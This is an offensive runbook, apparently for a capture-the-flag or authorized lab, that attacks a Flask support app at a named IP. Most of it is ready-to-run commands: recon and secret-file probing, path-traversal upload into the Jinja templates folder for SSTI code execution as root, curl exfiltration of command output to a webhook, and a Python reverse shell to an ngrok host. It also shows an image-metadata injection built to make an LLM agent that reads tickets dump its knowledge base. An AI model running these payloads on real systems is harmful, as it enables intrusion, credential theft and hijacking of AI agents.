# Recon + upload-to-shell — Atelier (18.217.39.191)

Authorized SIT lab, run from Kali (42.60.142.138). `export T=http://18.217.39.191`
and have `jar.txt` from an authenticated session (RUNBOOK STEP 1).

---

# PART A — RECON

## A1. Host / ports / TLS
```bash
nmap -Pn -sV -sC -p- --min-rate 2000 -oN atelier_full.txt 18.217.39.191
nmap -Pn -sV -p 22,80,443 --script "banner,http-headers,ssl-cert" 18.217.39.191
echo | openssl s_client -connect 18.217.39.191:443 2>/dev/null \
  | openssl x509 -noout -text | grep -A2 'Alternative Name'      # internal hostnames?
```

## A2. Web fingerprint + headers
```bash
whatweb -v "$T"
curl -skI "$T/"            # Server: Werkzeug/x Python/x  -> Flask dev server
curl -sk  "$T/health"      # app/db/llm_backend state
```

## A3. Content discovery (routes)
```bash
# directories/files
ffuf -u "$T/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403 -c -o ffuf_dirs.json
# API routes specifically
ffuf -u "$T/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc all -fc 404 -c 2>/dev/null
# quick hand-check of the obvious ones
for p in products about register login logout cart support support/tickets account \
         health console admin api api/chat api/tickets api/account orders metrics debug; do
  printf "%-18s " "/$p"
  curl -skb jar.txt -o /dev/null -w "%{http_code} %{redirect_url}\n" "$T/$p"
done
```

## A4. Leaked source / secrets  (defenders said the docker wasn't cleared)
```bash
for p in .git/config .git/HEAD .gitignore .env .env.bak app.py main.py wsgi.py \
         config.py settings.py requirements.txt Pipfile app.py.bak "app.py~" \
         .DS_Store docker-compose.yml Dockerfile backup.zip db.sqlite3 database.db; do
  printf "%-20s " "$p"
  curl -sk -o /dev/null -w "%{http_code} %{size_download}B\n" "$T/$p"
done
# if .git/config = 200:
pip install git-dumper 2>/dev/null && git-dumper "$T/.git/" ./src && \
  grep -riE 'secret_key|password|api[_-]?key|flag|popen|system|render_template_string' ./src
```

## A5. Parameter + static discovery
```bash
# JS often names the real endpoints and params
curl -skb jar.txt "$T/support" | grep -oiE '/static/[a-z0-9._/-]+' | sort -u
for js in app chat tickets main bundle; do
  curl -skb jar.txt "$T/static/$js.js" 2>/dev/null \
    | grep -oiE "(/api/[a-z0-9_/-]+|fetch\\([^)]*|append\\('[a-z_]+'|name:[ ]*'[a-z_]+')" | sort -u
done
# hidden params on a known endpoint
ffuf -u "$T/api/tickets/1/photo?FUZZ=x" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc all -fc 404 -fs 0 -c 2>/dev/null
```

## A6. Characterise the upload endpoint  (critical before exploiting)
```bash
# create a ticket, capture its id:
TID=$(curl -skb jar.txt -X POST "$T/api/tickets" -H 'Content-Type: application/json' \
  -d '{"subject":"recon","body":"recon"}' | grep -oiE '"id"[: ]*[0-9]+' | grep -oE '[0-9]+')
echo "ticket id = $TID"

# baseline: upload a real tiny image and read EVERYTHING the server returns
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' > /tmp/t.jpg
curl -skb jar.txt -F "file=@/tmp/t.jpg" "$T/api/tickets/$TID/photo" -D - | head -40
#   -> note: stored filename? returned URL/path? any JSON with a disk path?

# content-type / extension policy: what gets rejected?
for fn in a.jpg a.png a.gif a.php a.py a.html a.svg a.jpeg.php "a.jpg%00.php"; do
  printf "%-16s " "$fn"
  curl -skb jar.txt -F "file=@/tmp/t.jpg;filename=$fn" "$T/api/tickets/$TID/photo" \
    -o /dev/null -w "%{http_code}\n"
done

# where do files land + are they web-reachable? (fetch back what A6 baseline returned)
curl -skb jar.txt -o /dev/null -w "stored=%{http_code}\n" "$T/<the-returned-path>"
```
Record four facts: **accepted extensions**, **stored filename/path**, **whether the
stored file is web-reachable**, and **whether the filename is sanitised**
(`secure_filename` strips `../`). Those decide which upload technique below works.

---

# PART B — UPLOAD → SHELL

Flask does **not** execute uploaded `.php`/`.py`/`.jsp` from a static dir. A plain
web shell is a dead end here. The three techniques that work on this stack, in
order of reliability:

## B1. Filename traversal into templates/ → Jinja SSTI → RCE  ★ primary

If A6 shows the filename is not sanitised, escape the upload dir and drop a file
into the Jinja `templates/` folder. Anything rendered from there executes as root.

**Step 1 — prove the write lands and renders**
```bash
printf '%s' 'SSTI-WRITE-OK {{7*7}}' > /tmp/pwn.html
curl -skb jar.txt -F 'file=@/tmp/pwn.html;filename=../../app/templates/pwn.html' \
  "$T/api/tickets/$TID/photo"
curl -skb jar.txt "$T/pwn"          # see "SSTI-WRITE-OK 49" -> it rendered
```
Try these filename prefixes if the first misses (depth varies):
`../templates/pwn.html`, `../../templates/pwn.html`, `../../app/templates/pwn.html`,
`....//....//app/templates/pwn.html`, URL-encoded `..%2f..%2fapp%2ftemplates%2fpwn.html`.

**Step 2 — command execution (output via webhook, since you're NATed)**
```bash
printf '%s' '{{ cycler.__init__.__globals__.os.popen("id;hostname;ls -la /app").read() }}' > /tmp/pwn.html
curl -skb jar.txt -F 'file=@/tmp/pwn.html;filename=../../app/templates/pwn.html' "$T/api/tickets/$TID/photo"
curl -skb jar.txt "$T/pwn"          # output reflected in the page = RCE as root
# if output is NOT reflected, exfil it:
printf '%s' '{{ cycler.__init__.__globals__.os.popen("curl https://WEBHOOK-TOKEN/$(id|base64 -w0)").read() }}' > /tmp/pwn.html
curl -skb jar.txt -F 'file=@/tmp/pwn.html;filename=../../app/templates/pwn.html' "$T/api/tickets/$TID/photo"
curl -skb jar.txt "$T/pwn"          # watch webhook.site
```

## B2. Metadata/OCR injection (the "code inside the image")

If A6 shows the ingest extracts text from the image (EXIF/OCR) and the agent reads
it, the image is just a carrier — the sink is wherever that text lands. Use the
builder:
```bash
python3 tools/make_payload_image.py --payload 'x; curl https://WEBHOOK-TOKEN/$(id|base64 -w0)' -o /tmp/inj.jpg
python3 tools/make_payload_image.py --indirect -o /tmp/inj2.jpg     # KB-dump directive
curl -skb jar.txt -F "file=@/tmp/inj.jpg" "$T/api/tickets/$TID/photo"
# then make the agent read the ticket (LLM path), or just watch webhook.site
```

## B3. Real reverse shell (needs a PUBLIC listener — NAT note)

A true interactive shell needs the target to connect back to a routable address.
Your Kali is NATed (192.168.23.x), so `nc -lvnp` on it won't receive the connect.
Get a public endpoint first:
```bash
# option 1: ngrok TCP tunnel from Kali
ngrok tcp 4444                        # gives e.g. 0.tcp.ngrok.io:17890
nc -lvnp 4444                         # local listener ngrok forwards to
# option 2: a cheap cloud VPS with a public IP, run: nc -lvnp 4444
```
Then fire the shell through the SSTI template (point at the public host:port):
```bash
RS='python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"0.tcp.ngrok.io\",17890));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'
printf '%s' "{{ cycler.__init__.__globals__.os.popen('$RS').read() }}" > /tmp/pwn.html
curl -skb jar.txt -F 'file=@/tmp/pwn.html;filename=../../app/templates/pwn.html' "$T/api/tickets/$TID/photo"
curl -skb jar.txt "$T/pwn"            # catches on your listener
```
Note: uploaded artifacts get cleaned up, so grab what you need fast — or just use
B1/B2 command-exec-via-webhook, which needs no inbound and no persistence.

## After exec (any of B1/B2/B3)
```
id ; uname -a ; cat /proc/1/cgroup           # expect uid=0 in a container
cat /app/*.py /app/.env /root/.bash_history   # source + secrets + flag
grep -rniE 'flag|FLAG\{' /app /root /home 2>/dev/null | head
```
Read the source before relying on a shell — files vanish, source tells you the sink
and the remaining flags.
